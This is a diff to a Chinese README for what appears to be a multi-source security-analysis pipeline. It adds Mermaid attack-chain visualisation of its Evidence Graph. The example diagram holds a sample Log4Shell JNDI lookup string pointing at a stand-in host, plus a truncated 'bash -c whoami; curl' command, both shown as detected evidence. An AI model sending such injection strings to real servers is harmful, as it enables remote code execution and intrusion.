@@ -611,3 +611,35 @@ c2_sequence:HTTP Beacon / DNS C2 / TCP Beacon
 ```
 
 作用：Evidence Graph 用于把 `pkt-1 -> endpoint1-1 -> dnslog1-1` 这类跨源关系显式化，后续可以直接用于攻击链可视化、Graph RAG 或更细粒度 Agent 推理。
+
+## 16. Mermaid 攻击链可视化
+
+Evidence Graph 现在会同时输出 Mermaid flowchart：
+
+```text
+evidence_graph.mermaid
+```
+
+Markdown 报告的 `## Evidence Graph` 章节会包含：
+
+````markdown
+```mermaid
+flowchart TD
+  pkt_1["pkt-1\nHTTP\nGET /?x=${jndi:ldap://evil.example/a} ..."]
+  endpoint1_1["endpoint1-1\nENDPOINT\nbash -c whoami; curl ..."]
+  pkt_1 -->|same_asset| endpoint1_1
+  endpoint1_1 -->|process_external_connection| external_203_0_113_50_8080
+```
+````
+
+用途：
+
+- 在支持 Mermaid 的 Markdown 查看器中直接渲染攻击链图。
+- 快速观察入口流量、主机执行、外联/C2 之间的关系。
+- 后续可以把该图导出到报告系统或 Web UI。
+
+验证命令：
+
+```bash
+python tests/test_multisource_pipeline.py
+```
